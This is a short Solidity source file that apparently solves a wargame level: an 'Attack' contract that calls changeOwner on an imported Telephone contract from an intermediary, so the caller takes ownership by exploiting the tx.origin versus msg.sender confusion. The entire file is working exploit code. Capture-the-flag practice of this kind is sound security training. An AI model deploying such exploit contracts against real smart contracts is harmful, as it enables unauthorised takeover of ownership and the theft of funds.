// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./telephone.sol";

contract Attack {
    Telephone telephoneContract;

    constructor(address _telephoneContractAddr) {
        telephoneContract = Telephone(_telephoneContractAddr);
    }

    function attack() public {
        telephoneContract.changeOwner(msg.sender);
    }
}
